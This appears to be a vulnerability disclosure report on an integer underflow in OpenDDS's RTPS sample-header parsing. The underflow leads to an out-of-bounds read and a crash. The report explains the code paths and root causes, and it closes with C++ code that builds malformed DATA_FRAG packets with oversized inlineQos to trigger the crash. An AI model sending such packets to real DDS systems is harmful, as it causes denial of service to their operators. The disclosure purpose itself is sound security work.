# OpenDDS Integer Underflow Leading to Memory Out-of-Bounds Access Vulnerability Report

## I. Vulnerability Description

OpenDDS (`Open Data Distribution Service`) is an open-source implementation of DDS (`Data Distribution Service`) that provides high-performance, scalable real-time data communication solutions. OpenDDS contains a memory out-of-bounds access vulnerability in its RTPS (`Real-Time Publish-Subscribe`) protocol implementation caused by integer underflow, which attackers can exploit to cause program crashes (segmentation faults).

## II. Vulnerability Types

CWE-190: Integer Overflow or Wraparound

CWE-125: Out-of-bounds Read

CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer

## III. Vulnerability Environment

The vulnerability has been reproduced in `Ubuntu 24.04 LTS` (`docker`) testing OpenDDS 3.33 and the latest `master` branch. The following uses `Ubuntu 24.04 LTS` and OpenDDS 3.33 as examples.

## IV. Vulnerability Analysis

### 1. Specific Code Location

```cpp
// ./dds/DCPS/transport/rtps_udp/RtpsSampleHeader.cpp
void RtpsSampleHeader::init(ACE_Message_Block& mb)
{
    // ... other code omitted ...
    
    // Lines 174-178
    if ((data_ && (flags & (FLAG_D | FLAG_K_IN_DATA))) || frag_) {
      // These Submessages have a payload which we haven't deserialized yet.
      // The TransportReceiveStrategy will know this via message_length().
      // octetsToNextHeader does not count the SubmessageHeader (4 bytes)
      message_length_ = octetsToNextHeader + SMHDR_SZ - serialized_size_;
      // ...
    }
}
```

The integer underflow occurs at line 178.

`SMHDR_SZ` is a constant defined as 4, representing the length of the SubmessageHeader.

`octetsToNextHeader` is derived from the `submessageLength` field in the packet, indicating the number of bytes to the next submessage.

`serialized_size_` is the actual number of bytes read during submessage parsing, calculated as:
```cpp
serialized_size_ = starting_length - mb.total_length();
```

### 2. Direct Cause of the Vulnerability

`octetsToNextHeader` is only compared with `remaining` (the `message_length_` set by `pdu_remaining()`) in the `init()` function:

```cpp
// ./dds/DCPS/transport/rtps_udp/RtpsSampleHeader.cpp
// Lines 161-172
const ACE_CDR::UShort remaining = static_cast<ACE_CDR::UShort>(message_length_ - SMHDR_SZ);

if (octetsToNextHeader == 0 && kind != PAD && kind != INFO_TS) {
  // see RTPS v2.1 section 9.4.5.1.3
  // In this case the current Submessage extends to the end of Message,
  // so we will use the message_length_ that was set in pdu_remaining().
  octetsToNextHeader = remaining;

} else if (octetsToNextHeader > remaining) {
  valid_ = false;
  return;
}
```

However, the code **does not check** whether `octetsToNextHeader + SMHDR_SZ` is less than `serialized_size_`.

When an attacker constructs a malicious DATA_FRAG submessage:
- Sets a small `submessageLength` value (e.g., 36 bytes)
- But embeds large amounts of data in the `inlineQos` field, causing `serialized_size_` to be much larger than `octetsToNextHeader + SMHDR_SZ` during actual parsing
- For example: `octetsToNextHeader = 36`, `SMHDR_SZ = 4`, `serialized_size_ = 80`
- Calculation: `message_length_ = 36 + 4 - 80 = -40`
- Since `message_length_` is an unsigned type (`size_t`), `-40` is converted to `18446744073709551576` (64-bit) or `4294967256` (32-bit)

### 3. Crash Trigger Point

The crash occurs in the `RtpsUdpReceiveStrategy::handle_input()` function:

```cpp
// ./dds/DCPS/transport/rtps_udp/RtpsUdpReceiveStrategy.cpp
// Lines 154-187
while (bytes_remaining_unsigned > 0) {
    data_sample_header_.pdu_remaining(bytes_remaining_unsigned);
    data_sample_header_ = *cur_rb;  // Calls operator=, which then calls init()
    // ...
    
    // Line 180: Move read pointer
    cur_rb->rd_ptr(data_sample_header_.message_length());
    // ...
}
```

**First loop iteration**:
- Line 180 executes `cur_rb->rd_ptr(4294967256)`, moving the read pointer to an invalid location
- This may not immediately crash (as `rd_ptr()` only sets the pointer value)

**Second loop iteration**:
- Line 156: `data_sample_header_ = *cur_rb` calls `operator=`
- `operator=` calls `init(*cur_rb)`
- `init()` line 75: `const SubmessageKind kind = static_cast<SubmessageKind>(*mb.rd_ptr());`
- **Crash point**: Attempts to read data from an invalid `rd_ptr()` location, triggering a segmentation fault

### 4. Vulnerability Exploitation Chain

1. **Construct malicious DATA_FRAG submessage**:
   - Set a small `submessageLength` (36 bytes)
   - Embed large amounts of data in `inlineQos` (44 bytes of inlineQos)
   - Causes `serialized_size_` (80 bytes) to be much larger than the declared length (36 bytes) during actual parsing

2. **Trigger integer underflow**:
   - `message_length_ = octetsToNextHeader + SMHDR_SZ - serialized_size_` produces a negative number
   - After conversion to unsigned, becomes a huge value (`4294967256`)

3. **Cause memory out-of-bounds access**:
   - `cur_rb->rd_ptr(4294967256)` moves the read pointer beyond the buffer boundary
   - On the next loop iteration, `init()` attempts to read from an invalid location
   - Triggers segmentation fault, causing program crash

### 5. Indirect Causes of the Vulnerability

#### Cause 1: Missing Boundary Check
The code does not verify that `octetsToNextHeader + SMHDR_SZ >= serialized_size_` when calculating `message_length_`, allowing negative values to be produced.

#### Cause 2: Unsigned Type Conversion
`message_length_` is of type `size_t` (unsigned), so when the calculation result is negative, it is automatically converted to a huge unsigned value instead of triggering an error.

#### Cause 3: Missing Pointer Operation Validation
`cur_rb->rd_ptr()` does not check whether the new position is within the valid buffer range when moving the pointer.

#### Cause 4: Overly Permissive inlineQos Parsing
The parsing of `inlineQos` allows embedding arbitrary data as long as the structure is valid, providing attackers with opportunities to construct malicious data.

## V. Vulnerability Exploitation

### Exploitation Conditions

1. **Network Reachability**: The attacker needs to be able to send maliciously constructed RTPS packets to the target OpenDDS instance
2. **Port Access**: Access to DDS communication ports is required
3. **Information Gathering**: The attacker needs to obtain the GUID and entityId information of writers in normal communication in the target system, therefore the target system must use UDP communication
4. **Protocol Compatibility**: The target system must use RTPS over UDP transport

### Severity

As long as an attacker can monitor the writer information of the target system, they can easily cause subscriber crashes, making this vulnerability highly dangerous. This vulnerability can lead to:

1. **Denial of Service (DoS)**: The target program crashes immediately and cannot continue providing services
2. **Data Loss**: Data being processed at the time of crash may be lost
3. **System Instability**: Frequent attacks may cause the system to become unstable

## VI. Packet Construction

```cpp
// Generate UTC timestamp
char timestamp[8];
generateUTCTimestamp(timestamp);

// INFO_TS submessage
rtps_message.push_back(0x09); // INFO_TS
rtps_message.push_back(0x01); // Flags
rtps_message.push_back(0x08); // Length low
rtps_message.push_back(0x00); // Length high
for (int i = 0; i < 8; ++i) {
rtps_message.push_back(timestamp[i]);
}

// Generate multiple DATA_FRAG submessages (0x330 = 816)
for (int i = 0; i < 0x330; ++i) {
// Submessage ID
rtps_message.push_back(0x16); // DATA_FRAG

// Flags
rtps_message.push_back(0x03); // endianness + inline QoS flag

// Length (declared as 36 bytes, but actual data is much larger)
rtps_message.push_back(0x24); // Length low byte
rtps_message.push_back(0x00); // Length high byte

// Extra flags
rtps_message.push_back(0x00);
rtps_message.push_back(0x00);

// Octets to inline QoS
rtps_message.push_back(0x1c); // 28 bytes
rtps_message.push_back(0x00);

// Reader Entity ID
rtps_message.push_back(0x00);
rtps_message.push_back(0x00);
rtps_message.push_back(0x01);
rtps_message.push_back(0x04);

// Writer Entity ID
rtps_message.push_back(0x00);
rtps_message.push_back(0x00);
rtps_message.push_back(0x01);
rtps_message.push_back(0x03);

// Sequence Number (8 bytes, little endian)
uint32_t seq = 10000000 + seq_num;
for (int j = 0; j < 4; ++j) {
    rtps_message.push_back(0x00); // high 4 bytes
}
for (int j = 0; j < 4; ++j) {
    rtps_message.push_back(static_cast<char>((seq >> (j * 8)) & 0xFF));
}

// Fragment Number (4 bytes, little endian)
uint32_t frag_num = 1 + i;
for (int j = 0; j < 4; ++j) {
    rtps_message.push_back(static_cast<char>((frag_num >> (j * 8)) & 0xFF));
}

// Fragments in Submessage (2 bytes, little endian)
uint16_t frags_in_submsg = 0x330;
rtps_message.push_back(static_cast<char>(frags_in_submsg & 0xFF));
rtps_message.push_back(static_cast<char>((frags_in_submsg >> 8) & 0xFF));

// Fragment Size (2 bytes, little endian)
uint16_t frag_size = 0xffff;
rtps_message.push_back(static_cast<char>(frag_size & 0xFF));
rtps_message.push_back(static_cast<char>((frag_size >> 8) & 0xFF));

// Sample Size (4 bytes, little endian)
uint32_t sample_size = 0x32FFCD0;
for (int j = 0; j < 4; ++j) {
    rtps_message.push_back(static_cast<char>((sample_size >> (j * 8)) & 0xFF));
}

// Inline QoS data (large to trigger underflow)
std::vector<char> inline_qos_data;

// Create a submessage as parameter content
std::vector<char> submessage_data;
submessage_data.push_back(0x09); // INFO_TS
submessage_data.push_back(0x01); // Flags
submessage_data.push_back(0x08); // Length
submessage_data.push_back(0x00);
for (int j = 0; j < 8; ++j) {
    submessage_data.push_back(timestamp[j]);
}

std::string large_param(submessage_data.begin(), submessage_data.end());

// Parameter ID (PID_KEY_HASH = 0x0050)
uint16_t param_id = 0x0050;
inline_qos_data.push_back(static_cast<char>(param_id & 0xFF));
inline_qos_data.push_back(static_cast<char>((param_id >> 8) & 0xFF));

// Parameter length
uint16_t param_length = large_param.length() * 3;
inline_qos_data.push_back(static_cast<char>(param_length & 0xFF));
inline_qos_data.push_back(static_cast<char>((param_length >> 8) & 0xFF));

// Parameter data (3 copies)
inline_qos_data.insert(inline_qos_data.end(), large_param.begin(), large_param.end());
inline_qos_data.insert(inline_qos_data.end(), large_param.begin(), large_param.end());
inline_qos_data.insert(inline_qos_data.end(), large_param.begin(), large_param.end());

// 4-byte alignment
size_t current_size = inline_qos_data.size();
size_t aligned_size = (current_size + 3) & ~3;
while (inline_qos_data.size() < aligned_size) {
    inline_qos_data.push_back(0x00);
}

// PID_SENTINEL
inline_qos_data.push_back(0x01);
inline_qos_data.push_back(0x00);
inline_qos_data.push_back(0x00);
inline_qos_data.push_back(0x00);

// Add inline QoS to message
rtps_message.insert(rtps_message.end(), inline_qos_data.begin(), inline_qos_data.end());
}
```

